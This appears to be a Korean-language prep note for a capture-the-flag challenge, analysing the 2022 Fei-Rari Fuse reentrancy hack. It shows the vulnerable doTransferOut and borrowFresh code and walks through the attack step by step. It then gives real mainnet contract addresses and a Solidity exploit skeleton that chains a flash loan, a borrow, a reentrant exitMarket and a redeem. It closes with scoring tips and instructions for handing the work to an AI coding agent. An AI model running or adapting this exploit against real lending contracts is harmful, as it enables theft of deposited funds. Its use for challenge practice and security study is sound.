# Case: Fei-Rari (Ethereum, 2022-04-30)

## Overview

- **체인**: Ethereum mainnet
- **피해 금액**: ~$80M
- **공격 유형**: Cross-function reentrancy via cEther doTransferOut
- **참조**: rekt.news/fei-rari-rekt
- **공격자 컨트랙트**: `0x6162759edad730152f0df8115c698a42e666157f`

## 프로토콜 구조

Fei-Rari Fuse는 **Compound fork**. 단 두 가지 결정적 차이:
1. Permissionless pool 모델 (누구나 토큰 상장 가능)
2. CEther의 `doTransferOut`이 `transfer` → `call.value`로 변경됨 (가스 부족 → 가스 풍부)

### Compound 원본 (안전)
```solidity
function doTransferOut(address payable to, uint amount) internal {
    /* Send the Ether, with minimal gas and revert on failure */
    to.transfer(amount);  // 2300 gas — reentrancy 불가
}
```

### Fei-Rari 변경 (취약)
```solidity
function doTransferOut(address payable to, uint amount) internal {
    // Send the Ether and revert on failure
    (bool success, ) = to.call.value(amount)("");  // all gas → reentrancy 가능
    require(success, "doTransferOut failed");
}
```

### 취약한 borrow 흐름 (Compound 원본)
```solidity
function borrowFresh(...) internal returns (uint) {
    // checks
    // ...
    
    doTransferOut(borrower, borrowAmount);  // ← external call FIRST (CEI 위반!)
    
    /* We write the previously calculated values into storage */
    accountBorrows[borrower].principal = accountBorrowsNew;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows = totalBorrowsNew;
    
    // ...
}
```

원본 Compound는 transfer가 2300 gas라 reentrancy가 안 통했지만, Fei-Rari가 call로 바꾸면서 모든 gas가 넘어감 → 재진입 가능 → CEI 위반의 진짜 위험이 노출됨

## 공격 메커니즘

1. **Flash loan**: 150M USDC borrow
2. **fUSDC.mint(150M)**: USDC를 collateral로
3. **enterMarkets([fUSDC])**: 마켓 활성화
4. **fETH.borrow(1977 ETH)**: 
   - Comptroller가 LTV 체크 → 통과 (USDC 담보가 충분)
   - cEther.borrowFresh() 호출
   - **doTransferOut(attacker, 1977e18)** 호출 — call.value
   - **Attacker contract.receive() 진입** (재진입!)
5. **Reentrant: comptroller.exitMarket(fUSDC)**:
   - exitMarket이 attacker의 borrow를 체크하지만, **storage 아직 업데이트 안 됨** → "빚 없음"으로 보임
   - exitMarket 통과 → fUSDC 담보가 unlock
6. receive() 종료 → borrowFresh가 storage 업데이트 (이미 늦음)
7. **fUSDC.redeem(150M)**: 담보였던 USDC를 다시 가져감
8. **Flash loan 상환** + ETH 차익

핵심: 재진입 중에는 storage가 "빌리지 않은 상태"로 보임 → exitMarket로 담보 unlock → redeem으로 회수

## ch3 챌린지 적용

### 핵심 컨트랙트 주소 (메인넷)
- DAI: `0x6B175474E89094C44Da98b954EedeAC495271d0F`
- Unitroller (Comptroller proxy): `0xc54172e34046c1653d1920d40333Dd358c7a1aF4`
- fDAI (Fuse pool DAI): `0x7e9cE3CAa9910cc048590801e64174957Ed41d43`
- fETH (Fuse pool ETH): `0xbB025D470162CC5eA24daF7d4566064EE7f5F111`

### 공격 코드 골격
```solidity
contract FeiRariExploit {
    IFlashLoan FL;
    Comptroller UNITROLLER;
    CErc20 fDAI;
    CEther fETH;
    
    function exploit() external {
        // step 1: flashloan DAI
        FL.flashloan(DAI, 150_000_000e18, ...);
    }
    
    function onFlashLoan(...) external returns (...) {
        // step 2: deposit DAI
        DAI.approve(address(fDAI), type(uint).max);
        fDAI.mint(DAI.balanceOf(address(this)));
        
        // step 3: enter market
        address[] memory markets = new address[](1);
        markets[0] = address(fDAI);
        UNITROLLER.enterMarkets(markets);
        
        // step 4: borrow ETH (reentrancy trigger here)
        fETH.borrow(1977e18);  // → doTransferOut → receive() (재진입!)
        
        // step 6+: 담보 회수
        fDAI.redeem(fDAI.balanceOf(address(this)));
        
        // repay flashloan
        DAI.transfer(address(FL), 150_000_000e18 + fee);
    }
    
    receive() external payable {
        // step 5: exitMarket while storage stale
        UNITROLLER.exitMarket(address(fDAI));
    }
}
```

### 블록 / fork
- 공격 발생: 2022-04-30
- fork block: 챌린지 RPC가 정해줌. recon 단계에서 확인.

## 점수 최적화

- Fei-Rari는 한 번의 attack으로 큰 금액. 반복 거의 불요
- **여러 fToken 마켓** 노릴 수 있다면 각각 시도 (DAI, USDC, USDT, FRAI 등)
- ETH는 이미 native — 변환 불요. 점수 100% 직접 들어감

## A/B/C/D 분류

- A: CEI 위반 + cross-function nonReentrant 부재 + transfer→call 변경
- B: shared nonReentrant lock, transfer (2300 gas) 사용
- C: 단일 함수 lock만 적용 (Fei-Rari가 이마저도 부재)
- D: flash loan fee (Aave v2 0.09%, 150M = $135K), gas 미미

## Codex 위임 시 주의

- Comptroller는 proxy. EIP-1967 슬롯으로 implementation 확인 가능하지만 Comptroller는 Compound 표준 storage 레이아웃 따름
- enterMarkets는 array 인자 받음
- borrow 호출 시 reentrant guard 확인: cEther 코드에서 `nonReentrant` modifier 있는지 — Fei-Rari는 보통 borrowFresh에 안 걸려있음
- receive() fallback에서 reentrancy. 너무 많은 gas 쓰면 borrow가 fail
- 공격 후 본인 EOA로 ETH 전송 마지막에. Run.s.sol에서 broadcast로 본인 EOA 사용
